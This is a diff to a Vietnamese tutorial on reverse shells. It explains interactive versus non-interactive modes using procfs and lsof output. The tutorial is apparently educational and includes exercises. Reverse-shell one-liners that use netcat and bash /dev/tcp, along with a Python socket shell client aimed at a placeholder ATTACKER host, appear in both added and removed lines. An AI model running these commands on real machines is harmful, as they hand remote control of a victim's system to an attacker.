@@ -35,7 +35,7 @@ Reverse Shell là chương trình cho phép:
 
 Ví dụ: Reverse shell sử dụng netcat
 1. Attacker mở kết nối port 4444: `nc -lvnp 4444`
-2. Client (victim) kết nối đến port 4444: `nc attacker_ip 4444 -e /bin/bash`
+2. Client (victim) kết nối đến port 4444: `bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/9191 <&1'` *Những phiên bản mới của netcat không sử dụng được option `-e`. Có thể sử dụng thay thế bằng `ncat`.
 
 <details>
 <summary>Tại sao lại sử dụng Reverse Shell?</summary>
@@ -349,40 +349,112 @@ while True:
     except BlockingIOError:
         break
 ```
+
 </details>
 
-===================== Phần dưới hoàn thiện sau.
+<details>
+<summary>Code phía client có vấn đề gì gây ảnh hưởng đến tính ổn định không?</summary>
 
-- PHía server: test case và giải pháp
-- Phía client: send 1 buffer quá lớn
+Dòng `output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)` lấy toàn bộ dữ liệu từ output lưu vào 1 biến và gửi đi. Trên lý thuyết, nếu dữ liệu output quá lớn có thể ảnh hưởng đến lượng memory mà client sử dụng, cũng như lưu lượng mạng để truyền tải file.
+</details>
 
-TODO: giải thích interactive và non interactive, kiểm chứng ví dụ
-phân biệt:
-- Interactive Có TTY, có prompt, hỗ trợ Ctrl+C, tab-complete, ...
-- Non interactive: không có tính năng trên
+## Hạn chế thứ 2.
+Đầu tiên, chạy reverse shell với bash `bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/9191 <&1'` rồi thử chạy `vi /tmp/hehe` từ phía server rồi thoát editor. Sau đó thử tương tự nhưng phía client chạy reverse shell bằng py đã viết.
 
-Tạo interactive shell và non interactive shell
-- Bash: `bash -i >& /dev/tcp/ATTACKER/4444 0>&1`
-- Python:
-```
-import socket, subprocess
+<details>
+<summary>Nhận xét sự khác biệt</summary>
 
-s = socket.socket()
-s.connect(("ATTACKER", 4445))
-
-while True:
-    cmd = s.recv(1024).decode()
-    output = subprocess.getoutput(cmd)
-    s.send(output.encode())
+Sau lệnh vi, phía server bị treo. Nếu thử list các process trên phía client, ví dụ `ps -aux | grep hehe`, ta thấy process vẫn đang chạy
 
 ```
+dmknght   150065  0.0  0.0   2580  1536 pts/4    S+   08:05   0:00 /bin/sh -c vi /tmp/hehe
+dmknght   150066  0.0  0.0  91704 13568 pts/4    Sl+  08:05   0:00 vi /tmp/hehe
+```
 
-- Chạy `sudo su -`, non-interactive shell bị hang còn interactive shell hoạt động bt
+Điều này có nghĩa là vì một lý do nào đó, process vẫn đang chạy nhưng phía server không thể điều khiển được. (ngay cả khi sử dụng **Ctrl+C** để stop server, phía client vẫn tiếp tục chạy process cho đến khi bị kill.)
+</details>
 
-Bài tập:
-- Viết non-interactive shell với python nhưng xử lý vấn đề socket
+## Interactive, Non-Interactive và nâng cấp.
+Từ [định nghĩa các chế độ hoạt động của bash](https://en.wikipedia.org/wiki/Bash_(Unix_shell)#Modes), ta có thể rút ra được vài điểm chính sau:
+- Interactive mode (chế độ tương tác), thực hiện lấy dữ liệu từ stdin, đưa stdout và stderr ra stdin.
+- Non-Interactive mode (chế độ không tương tác) sẽ thực hiện 1 lệnh hoặc chuỗi lệnh mà không cần người dùng tương tác.
 
-## Nâng cấp non-interactive shell trên python:
+<details>
+<summary>Vậy đối với reverse shell như ncat hay bash, tại sao phía server nhận được dữ liệu từ stdout?</summary>
+
+#### Đối với lệnh bash, ta có những điểm sau:
+  1. Sử dụng flag `-i` để sử dụng interactive mode
+  2. Sử dụng [Tính năng redirection để redirect stdout và stderror tới TCP socket](https://www.gnu.org/software/bash/manual/html_node/Redirections.html#Redirecting-Standard-Output-and-Standard-Error). *Note: Để sử dụng tính năng này, [bash cần được compile với flag --enable-net-redirections](https://unix.stackexchange.com/a/217488)*.
+  3. Sử dụng [duplicate file descriptors của redirection trong bash](https://www.gnu.org/software/bash/manual/html_node/Redirections.html#Duplicating-File-Descriptors) để redirect **output của socket** vào **stdin của bash**.
+
+Như vậy, ta có thể sử dụng [procfs](https://en.wikipedia.org/wiki/Procfs) để kiểm tra `file descriptor` của tiến trình đang chạy. Ta có thể so sánh file descriptor của tiến trình terminal emulator mới và reverse shell chạy bằng bash:
+- Với tiến trình terminal emulator mới:
+  1. Chạy `echo $$` để thấy process ID của chính terminal hiện tại. Ví dụ:
+  ```
+  └╼dmknght$echo $$
+  159636
+  ```
+  2. Kiểm tra file descriptor trong `procfs`. Đường dẫn có dạng `/proc/<pid>/fd`. Ví dụ: `└╼dmknght$ls -lah /proc/159636/fd`. Kết quả cho rất nhiều file descriptors với ID khác nhau được thể hiện dưới dạng [symlink](https://en.wikipedia.org/wiki/Symbolic_link). Trong đó có 1 số kết quả như:
+  ```
+  lrwx------ 1 dmknght dmknght 64 Dec  9 09:34 0 -> /dev/pts/6
+  lrwx------ 1 dmknght dmknght 64 Dec  9 09:36 1 -> /dev/pts/6
+  lrwx------ 1 dmknght dmknght 64 Dec  9 09:36 2 -> /dev/pts/6
+  ```
+- So sánh với kết quả từ reverse shell:
+  ```
+  └╼dmknght$ls -lah /proc/157571/fd
+  total 0
+  dr-x------ 2 dmknght dmknght  4 Dec  9 09:12 .
+  dr-xr-xr-x 9 dmknght dmknght  0 Dec  9 09:12 ..
+  lrwx------ 1 dmknght dmknght 64 Dec  9 09:12 0 -> 'socket:[2133132]'
+  lrwx------ 1 dmknght dmknght 64 Dec  9 09:12 1 -> 'socket:[2133132]'
+  lrwx------ 1 dmknght dmknght 64 Dec  9 09:12 2 -> 'socket:[2133132]'
+  lrwx------ 1 dmknght dmknght 64 Dec  9 09:12 255 -> /dev/tty
+  ```
+
+Như vậy, toàn bộ file descriptor của reverse shell đang được kết nối tới socket. Nếu tiếp tục kiểm tra kết nối này, ta có thể căn cứ vào giá trị ID của socket vừa được list ở trên như sau:
+```
+└╼dmknght$cat /proc/net/tcp | grep 2133132
+56: 0100007F:BEAA 0100007F:23E7 01 00000000:00000000 00:00000000 00000000  1000        0 2133132 1 00000000a90bf9f7 20 0 0 10 -1
+```
+
+Đây là giá trị được thể hiện dưới dạng hex. Sử dụng [Format hiển thị của kết nối TCP trong procfs](https://www.kernel.org/doc/Documentation/networking/proc_net_tcp.txt), ta sẽ được connection kết nối `127.0.0.1:48810 -> 127.0.0.1:9191` và các thông tin khác. Ngoài ra, có thể sử dụng lệnh `lsof` để lấy thông tin tương tự. Ví dụ `lsof | grep 2133132` sẽ có kết quả
+```
+bash      157571                           dmknght    0u     IPv4            2133132         0t0      TCP localhost:48810->localhost:9191 (ESTABLISHED)
+bash      157571                           dmknght    1u     IPv4            2133132         0t0      TCP localhost:48810->localhost:9191 (ESTABLISHED)
+bash      157571                           dmknght    2u     IPv4            2133132         0t0      TCP localhost:48810->localhost:9191 (ESTABLISHED)
+```
+
+#### Đối với ncat
+Đối với ncat, việc sử dụng file redirection có sự khác biệt:
+
+```
+└╼dmknght$ls -lah /proc/163259/fd
+total 0
+dr-x------ 2 dmknght dmknght  6 Dec  9 09:50 .
+dr-xr-xr-x 9 dmknght dmknght  0 Dec  9 09:49 ..
+lrwx------ 1 dmknght dmknght 64 Dec  9 09:50 0 -> /dev/pts/4
+lrwx------ 1 dmknght dmknght 64 Dec  9 09:50 1 -> /dev/pts/4
+lrwx------ 1 dmknght dmknght 64 Dec  9 09:50 2 -> /dev/pts/4
+lrwx------ 1 dmknght dmknght 64 Dec  9 09:50 3 -> 'socket:[2177954]'
+l-wx------ 1 dmknght dmknght 64 Dec  9 09:50 5 -> 'pipe:[2177955]'
+lr-x------ 1 dmknght dmknght 64 Dec  9 09:50 6 -> 'pipe:[2177956]'
+```
+
+Thật vậy, `ncat` không sử dụng việc redirect stdin và stdout tới pipe. Nguyên nhân là khi [thực hiện lệnh hệ thống](https://github.com/nmap/nmap/blob/master/ncat/ncat_posix.c#L150), `ncat` sử dụng [fork](https://man7.org/linux/man-pages/man2/fork.2.html) để tạo một tiến trình mới và sử dụng [pipe](https://man7.org/linux/man-pages/man2/pipe.2.html) để communicate với nó. Dữ liệu đưa qua socket sử dụng [dup2](https://man7.org/linux/man-pages/man2/dup2.2.html) để sao chép file descriptor của process con và của socket connection.
+TODO làm rõ hơn vấn đề redirection vì code của ncat đang chưa clear phần redirection (struct / mảng child_stdin ở đâu ra?)
+
+</details>
+
+<details>
+<summary>Liệu thời điểm lấy output có khác nhau không?</summary>
+Chạy: `for i in $(seq 1 5); do echo "$i"; sleep 1; done` trên reverse shell và shell thường (hoặc thử reverse shell) => interactive chạy real time còn non-interactive đợi chạy xong, lấy output và gửi
+</details>
+
+
+## Kiểm tra, chuyển đổi sang Interactive Mode
+TODO: kiểm tra: `echo $-`
+TODO: nâng cấp shell
 ```
 import pty
 pty.spawn("/bin/bash")
@@ -393,3 +465,4 @@ Bài tập:
 - Viết reverse shell với python nhưng sử có interactive shell
 - Tìm, đọc và giải thích code interactive reverse shell trên C
 
+## Tạo Interactive Reverse Shell
